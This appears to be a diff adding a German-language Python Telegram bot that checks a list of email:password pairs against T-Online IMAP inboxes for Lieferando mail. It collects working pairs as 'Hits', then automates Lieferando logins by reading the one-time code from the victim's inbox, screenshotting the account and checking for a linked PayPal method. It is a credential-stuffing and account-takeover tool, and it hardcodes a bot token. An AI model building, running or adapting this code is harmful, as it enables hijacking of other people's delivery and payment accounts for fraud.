@@ -1,0 +1,618 @@
+# =========================================================
+# TELEGRAM LIEFERANDO BOT
+# =========================================================
+#
+# FEATURES:
+#
+# /suche
+# -> prüft alle Accounts auf Lieferando Mails
+# -> erstellt Hits.txt
+# -> sendet Hits.txt in Telegram
+#
+# /login 0
+# -> startet Login für Account 0
+# -> OTP automatisch
+# -> Screenshot
+# -> PayPal Check
+#
+# =========================================================
+#
+# INSTALL:
+#
+# pip install python-telegram-bot playwright
+#
+# playwright install
+#
+# START:
+#
+# python bot.py
+#
+# =========================================================
+#
+# accounts.txt FORMAT:
+#
+# mail@example.de:password
+#
+# =========================================================
+
+from telegram import Update
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    ContextTypes
+)
+
+from playwright.sync_api import sync_playwright
+
+import imaplib
+import email
+import re
+import time
+import threading
+
+# =========================================================
+# BOT TOKEN
+# =========================================================
+
+BOT_TOKEN = "8708254363:AAHcjiJkohqKUH2os-dhZy-x6tLC4l_1oKs"
+
+# =========================================================
+# IMAP
+# =========================================================
+
+IMAP_SERVER = "secureimap.t-online.de"
+
+# =========================================================
+# ACCOUNTS LADEN
+# =========================================================
+
+accounts = []
+
+try:
+
+    with open(
+        "accounts.txt",
+        "r",
+        encoding="utf-8"
+    ) as f:
+
+        for line in f:
+
+            line = line.strip()
+
+            if ":" in line:
+
+                email_address, password = line.split(":", 1)
+
+                accounts.append(
+                    (
+                        email_address.strip(),
+                        password.strip()
+                    )
+                )
+
+    print(f"{len(accounts)} Accounts geladen")
+
+except Exception as e:
+
+    print("ACCOUNTS FEHLER")
+    print(e)
+
+    exit()
+
+# =========================================================
+# OTP HOLEN
+# =========================================================
+
+def get_lieferando_code(
+    EMAIL,
+    PASSWORD
+):
+
+    try:
+
+        mail = imaplib.IMAP4_SSL(
+            IMAP_SERVER,
+            993
+        )
+
+        mail.login(
+            EMAIL,
+            PASSWORD
+        )
+
+        mail.select("inbox")
+
+        status, messages = mail.search(
+            None,
+            '(UNSEEN)'
+        )
+
+        mail_ids = messages[0].split()
+
+        for mail_id in reversed(mail_ids):
+
+            status, msg_data = mail.fetch(
+                mail_id,
+                "(RFC822)"
+            )
+
+            raw_email = msg_data[0][1]
+
+            msg = email.message_from_bytes(
+                raw_email
+            )
+
+            subject = str(
+                msg.get("Subject")
+            )
+
+            sender = str(
+                msg.get("From")
+            )
+
+            if (
+                "lieferando" in subject.lower()
+                or "lieferando" in sender.lower()
+                or "takeaway" in sender.lower()
+            ):
+
+                body = ""
+
+                if msg.is_multipart():
+
+                    for part in msg.walk():
+
+                        if part.get_content_type() in [
+                            "text/plain",
+                            "text/html"
+                        ]:
+
+                            try:
+
+                                body = (
+                                    part.get_payload(
+                                        decode=True
+                                    ).decode(
+                                        errors="ignore"
+                                    )
+                                )
+
+                                break
+
+                            except:
+                                pass
+
+                else:
+
+                    try:
+
+                        body = (
+                            msg.get_payload(
+                                decode=True
+                            ).decode(
+                                errors="ignore"
+                            )
+                        )
+
+                    except:
+                        pass
+
+                match = re.search(
+                    r"(\d{6})",
+                    body
+                )
+
+                if match:
+
+                    code = match.group(1)
+
+                    mail.logout()
+
+                    return code
+
+        mail.logout()
+
+    except Exception as e:
+
+        print(e)
+
+    return None
+
+# =========================================================
+# LOGIN
+# =========================================================
+
+def run_login(
+    chat_id,
+    bot,
+    EMAIL,
+    PASSWORD
+):
+
+    try:
+
+        bot.send_message(
+            chat_id=chat_id,
+            text=f"Starte Login:\n{EMAIL}"
+        )
+
+        with sync_playwright() as p:
+
+            browser = p.chromium.launch(
+                headless=False,
+                args=[
+                    "--disable-blink-features=AutomationControlled"
+                ]
+            )
+
+            context = browser.new_context(
+                viewport={
+                    "width": 1280,
+                    "height": 900
+                }
+            )
+
+            page = context.new_page()
+
+            page.goto(
+                "https://www.lieferando.de"
+            )
+
+            page.wait_for_timeout(5000)
+
+            # =========================================
+            # ANMELDEN
+            # =========================================
+
+            try:
+
+                page.get_by_role(
+                    "button",
+                    name="Anmelden"
+                ).click()
+
+            except:
+
+                bot.send_message(
+                    chat_id=chat_id,
+                    text="Anmelden Button nicht gefunden"
+                )
+
+                browser.close()
+
+                return
+
+            page.wait_for_selector(
+                'input[type="email"]'
+            )
+
+            page.fill(
+                'input[type="email"]',
+                EMAIL
+            )
+
+            page.keyboard.press("Enter")
+
+            bot.send_message(
+                chat_id=chat_id,
+                text="Warte auf OTP..."
+            )
+
+            code = None
+
+            for _ in range(30):
+
+                code = get_lieferando_code(
+                    EMAIL,
+                    PASSWORD
+                )
+
+                if code:
+                    break
+
+                time.sleep(2)
+
+            if code:
+
+                bot.send_message(
+                    chat_id=chat_id,
+                    text=f"OTP:\n{code}"
+                )
+
+                try:
+
+                    page.locator(
+                        'input'
+                    ).nth(0).fill(code)
+
+                except Exception as e:
+
+                    bot.send_message(
+                        chat_id=chat_id,
+                        text=f"OTP Feld Fehler:\n{e}"
+                    )
+
+            else:
+
+                bot.send_message(
+                    chat_id=chat_id,
+                    text="Kein OTP gefunden"
+                )
+
+            page.wait_for_timeout(5000)
+
+            # =========================================
+            # SCREENSHOT
+            # =========================================
+
+            try:
+
+                page.screenshot(
+                    path="screen.png",
+                    full_page=True
+                )
+
+                with open(
+                    "screen.png",
+                    "rb"
+                ) as photo:
+
+                    bot.send_photo(
+                        chat_id=chat_id,
+                        photo=photo
+                    )
+
+            except Exception as e:
+
+                bot.send_message(
+                    chat_id=chat_id,
+                    text=f"Screenshot Fehler:\n{e}"
+                )
+
+            # =========================================
+            # PAYPAL CHECK
+            # =========================================
+
+            bot.send_message(
+                chat_id=chat_id,
+                text="Prüfe PayPal..."
+            )
+
+            paypal_found = False
+
+            paypal_selectors = [
+
+                "text=PayPal",
+                "text=paypal",
+
+                '[value*="paypal"]',
+                '[id*="paypal"]',
+
+                '[for*="paypal"]',
+
+                'img[alt*="PayPal"]',
+                'img[src*="paypal"]'
+            ]
+
+            for selector in paypal_selectors:
+
+                try:
+
+                    if (
+                        page.locator(
+                            selector
+                        ).count() > 0
+                    ):
+
+                        paypal_found = True
+
+                        break
+
+                except:
+                    pass
+
+            if paypal_found:
+
+                bot.send_message(
+                    chat_id=chat_id,
+                    text="✅ PayPal verfügbar"
+                )
+
+            else:
+
+                bot.send_message(
+                    chat_id=chat_id,
+                    text="❌ Kein PayPal gefunden"
+                )
+
+            bot.send_message(
+                chat_id=chat_id,
+                text="Login fertig"
+            )
+
+            time.sleep(60)
+
+            browser.close()
+
+    except Exception as e:
+
+        bot.send_message(
+            chat_id=chat_id,
+            text=f"FEHLER:\n{e}"
+        )
+
+# =========================================================
+# /suche
+# =========================================================
+
+async def suche(
+    update: Update,
+    context: ContextTypes.DEFAULT_TYPE
+):
+
+    await update.message.reply_text(
+        "Suche gestartet..."
+    )
+
+    hits = []
+
+    for EMAIL, PASSWORD in accounts:
+
+        try:
+
+            mail = imaplib.IMAP4_SSL(
+                IMAP_SERVER,
+                993
+            )
+
+            mail.login(
+                EMAIL,
+                PASSWORD
+            )
+
+            mail.select("inbox")
+
+            status, messages = mail.search(
+                None,
+                'ALL'
+            )
+
+            mail_ids = messages[0].split()
+
+            found = False
+
+            for mail_id in reversed(mail_ids[-30:]):
+
+                status, msg_data = mail.fetch(
+                    mail_id,
+                    "(RFC822)"
+                )
+
+                raw_email = msg_data[0][1]
+
+                msg = email.message_from_bytes(
+                    raw_email
+                )
+
+                subject = str(
+                    msg.get("Subject")
+                )
+
+                sender = str(
+                    msg.get("From")
+                )
+
+                if (
+                    "lieferando" in subject.lower()
+                    or "lieferando" in sender.lower()
+                    or "takeaway" in sender.lower()
+                ):
+
+                    found = True
+                    break
+
+            mail.logout()
+
+            if found:
+
+                hits.append(
+                    f"{EMAIL}:{PASSWORD}"
+                )
+
+        except Exception as e:
+
+            print(e)
+
+    # =========================================
+    # HITS TXT
+    # =========================================
+
+    with open(
+        "Hits.txt",
+        "w",
+        encoding="utf-8"
+    ) as f:
+
+        for hit in hits:
+
+            f.write(hit + "\n")
+
+    with open(
+        "Hits.txt",
+        "rb"
+    ) as file:
+
+        await context.bot.send_document(
+            chat_id=update.effective_chat.id,
+            document=file
+        )
+
+    await update.message.reply_text(
+        f"Fertig\nHits: {len(hits)}"
+    )
+
+# =========================================================
+# /login
+# =========================================================
+
+async def login(
+    update: Update,
+    context: ContextTypes.DEFAULT_TYPE
+):
+
+    try:
+
+        index = int(
+            context.args[0]
+        )
+
+        EMAIL, PASSWORD = accounts[index]
+
+        threading.Thread(
+            target=run_login,
+            args=(
+                update.effective_chat.id,
+                context.bot,
+                EMAIL,
+                PASSWORD
+            )
+        ).start()
+
+        await update.message.reply_text(
+            "Login gestartet"
+        )
+
+    except Exception as e:
+
+        await update.message.reply_text(
+            f"Fehler:\n{e}"
+        )
+
+# =========================================================
+# BOT START
+# =========================================================
+
+app = (
+    ApplicationBuilder()
+    .token(BOT_TOKEN)
+    .build()
+)
+
+app.add_handler(
+    CommandHandler(
+        "suche",
+        suche
+    )
+)
+
+app.add_handler(
+    CommandHandler(
+        "login",
+        login
+    )
+)
+
+print("BOT ONLINE")
+
+app.run_polling()
